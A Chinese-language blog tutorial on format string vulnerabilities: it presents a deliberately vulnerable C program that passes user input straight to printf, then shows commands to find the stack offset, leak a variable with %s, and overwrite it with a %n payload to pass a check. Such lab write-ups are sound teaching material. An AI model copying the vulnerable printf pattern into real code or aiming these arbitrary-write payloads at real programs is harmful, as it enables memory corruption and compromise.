---
layout: post
title: "格式化字符串漏洞解析和利用"
---

#### 0x00 前言 ####

环境： kali 2016.2 i386
工具： peda

#### 0x01 漏洞描述 ####

Format String Vulnerability(格式化字符串漏洞)，漏洞的主要原理是由于使用用户的输入作为格式化字符串，通常针对的是print家族的函数(printf,sprintf,fprintf).常见的漏洞格式为

	printf(User_input);

由于printf并没有限定参数的个数，导致在user_input后面的数据都被解析为printf的参数，通过构造特定的格式化字符串，达到数据泄漏和数据写入。

如果`User_input="%x.%x`"被传入到printf中时，就会泄露栈上8个字节的数据信息。

#### 0x02 漏洞示例 ####

漏洞程序代码：

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>

	int magic = 0x33445566;
	int key = 0x6c6d6e6f;

	int main(int argc, char *argv[]) {
    	char msg[256];
    	strcpy(msg, argv[1]);
   		printf(msg);
    	printf("\n");
    	if (magic == 0x6c6d6e6f) {
        	puts("nice job");
    	}   
    	return 0;
	}

编译：

	gcc -no-pie -o vul vul.c


首先计算计算用户的输入距离print函数的偏移(方便后续的读和写)

	addr1=$'\xaa\xbb\xcc\xdd'
	addr2=$'\x11\x22\x33\x44'
	for i in `seq 1 10`; do ./vul $addr1$addr2' '$i$' %'$i$'$p\n'; done

其中addr1为bash的变量，$表示转义

![formatsv]({{ '/images/201804/format_string_vul_2_1.png' | prepend: site.baseurl }})

通过输出我们可以得出用户的输入在偏移4和5的地方。

接下来我们尝试读取magic地址存放的字符，通过readelf获取变量的地址

![formatsv]({{ '/images/201804/format_string_vul_2_2.png' | prepend: site.baseurl }})

magic的地址为`0x080497a4`,通过设置addr环境变量为magic的地址来读取

	addr=$'\xa4\x97\x04\x08'
	./vul $addr'|%4$s'

![formatsv]({{ '/images/201804/format_string_vul_2_3.png' | prepend: site.baseurl }})

fUD3为magic的值，而onml是key的值，由于他们都存在于.data段中，并且是相邻的，因此通过%s都一起读取出来了

我们最后的目的是修改magic的值为0x6c6d6e6f通过检测

这里我们无法直接传入4个字节转入的10进制的数字，因为太大导致屏幕会一直在输入效率很低，通过以下的计算方式进行连续4字节的数据写入

如何写入连续的4个字节的数据

<pre>// We want to write the value n=0xdeadf00d to "address"
// Lower 16bits of n = 0xf00d = 61453
// Higher 16bits of n = 0xdead = 57005
int amount_lower = 61453;
int amount_higher = (57005 - 61453 + 0x10000) & 0xffff;
// amount_higher = 61088
// resulting in the following format string:
// (note the parameter indices for both addresses)
const char *fmt = "%61453c%5$n%61088c$6n";</pre>

我们需要写入0x6c6d6e6f

	low = 0x6e6f = 28271
	high = 0x6c6d = 27757

	r_high = (27757 - 28271 + 0x10000) & 0xffff = 0xfdfe = 65022

因此我们需要传入的参数为
	
	python -c 'print "\xa4\x97\x04\x08\xa6\x97\x04\x08|%28262c%4$n%65022c%5$n"'

通过gdb调试以下为在调用printf前的栈布局

![formatsv]({{ '/images/201804/format_string_vul_2_4.png' | prepend: site.baseurl }})

以下是调用后

![formatsv]({{ '/images/201804/format_string_vul_2_5.png' | prepend: site.baseurl }})

发现目标地址`0x080497a4`地址的内容成功被改写，并顺利绕过

![formatsv]({{ '/images/201804/format_string_vul_2_6.png' | prepend: site.baseurl }})

#### 0x03 总结 ####

通过程序演示，我们可以通过格式化字符串漏洞进行任意地址的读(目前知道通过%s来以字符串的形式泄漏)以及任意地址写，该漏洞在ctf经常用于信息泄漏